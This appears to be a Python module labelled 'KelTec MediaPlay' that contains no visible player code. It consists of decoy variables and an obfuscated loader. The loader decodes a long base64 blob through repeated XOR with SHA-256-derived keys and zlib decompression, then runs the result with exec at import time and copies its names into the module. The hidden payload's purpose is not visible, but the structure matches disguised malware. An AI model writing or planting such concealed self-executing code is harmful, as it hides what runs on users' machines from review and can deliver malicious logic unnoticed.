# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 490063 ^ 567680
_lx1_1 = len("d3c7fb")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-218748)
_lx3_3 = 102487 * 0
_lx4_4 = 487136 ^ 728343
_K = 'dddce14decc79afd4bcba4862486439a08579d954f257364b51158d6e483661e'
_M = 'iUCEBC1fqmNLcRPqaF+lDObFQHoHsMT059KZKReJ6NncGYBIdkjtbEF1GrxvDfMI4coTLQaxl/+2hs55R4y1i9pK1xh1ErtiFH0Q'
_D = '==Any7tOoV6zX3eK8pL53ogH15P2GradCp6V6VDiDkDyNH5oO62tzhZq9f+vNll5JnnCHjvCOjFQB/uDzVXLF8AFN/5MNza9lfcR+hCuhtIUlDCwUQhX9OdfQ6yVV54ewBj3voGFFKaYp9OI3VrCSpCmqyaG+JaNmWHUCnUbK4qsjr7H5gv0bLBDnla0/FHa4Q3Am0Q8qLEHtTjkwKApjJDPz1saP4e6fCq8Ur2MwRJu8CV4U8do05n6xvyjA/7uaV4mQo1VgOts8Gl+Nt43H48QXgEKIy1aL7oP40fX2OwKyii8Z4LhaOooQo5zmh3/HngtN+LYiUUZ3WR5i+WkRk6n26aD3O21SR2aRjplU00MelpTrp4wMjWHyB6MY2+3ZcLiBLcRQ0ta+230auc4jURJdlTfYgpogeu80YL/OxBw/pvHuH1IAV7yG5uVHs2p0V+yP9L4X1i4qGGQ5H38aIXEoXDF6CgHuoUQA503BDDruC+XhczDnKDfae3ViPzclq0GV4rPCmCsmiGiTNnnmbl9deSIdud8KD6C2msJIc5ExM7xBGC9s/SVeQA1W2cggf49alo1afMwNMJKUyPnCKybeaSNi1cskYUQLkdoHR5/g/pcUGEBrc7oXRY4DS3YszHeNn0YQrPScD2rIMIGhxa542JiDUrbBa7bCgSIXm+WbjTyJ5yVlD5YgSpfVCR9pQR3mTPcllHWE5beRSJZNMHdjhhgbozqjJM8BaOoQBzpwCLUFLgiYbN3Gi/DSmiF/uW9y4wf7EsRSqYta2Vhvz9ryPz/M5CY+2ufKOohfca0/E0rZgTrVUJA6qCcmXt+ZcAhquPE0bzeZ+ZYcs3NQwnmAHARaZz/RpXe1F3K+OycQYOF/1ckIw42uHaLeg2LZ1hRHivWZ0g8peY9QSqvaqrKVLpnDi4757/AIIAWdBSlRLvq3Wrr9wVEzJkPeCOFhb/eAnNX2ha8kc+gw1fQbqSk8rG4QGmrFm+UXN1j5aAvW4emP/IkMdU3mQvkOSx48nV4huFBbbh3bnq9InygTWY1nukmLyo/YL5OBUrJBx/G6eyguMfP0skVaMY+zXWwtktX7+Q4f6MF1FEy0RLwh3MinUTR4aBA6gW7YytpybR5AOMHxStATCYHOU416qJFjicE3n+WJnGKwJSkll38bgHO/9gmJVLTjAOh27uYsyaNv2ziTPEMfmJfT26cOsOXYtniHb3IptGdeaZFbFLIiRw2YPmDGFiOhy3Yk3hZQE6XyBXmzE0SjBp4i5vUBFvXhwrklkpbA03X0I49J0q+Ar0k9rk2rNUs5DW9u/Od9X2eKOjtqRROqhm81+X9pFw7+BEk3O0u2/2Ppx0WPed4a2ifYbYdOEqdBFN8rmJvSRPXpkFKWtrQC/lR4gpZCKCzRL+45kJbXK4tYFDy3vyBNeWSh94ybXpUJ7ZOma5jmWKSS6wRk6ILvXMRgckJBineIzeyxIVx/uy9ViBmIWCEOaG3CMGlwWch8IffrOE30kF8lkdgRM+/cMWMnoVxPhcZE+5t2Dnt3p3Np2bfwrlrMXEUqeebywhJ20R2qNocnSQ8vAxMPFVHGoyn7zafhKLGUOPBfP6X6VJuT7tjucS4zgZ6EKgH40P3TeeaNiA9ThT0T9ZGuGpz6lZAW6alZgU1UtUK0h5pS+6ZYVDyhp4kStsomGPJRkj1LjZIW3ydEE7/bu/p'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})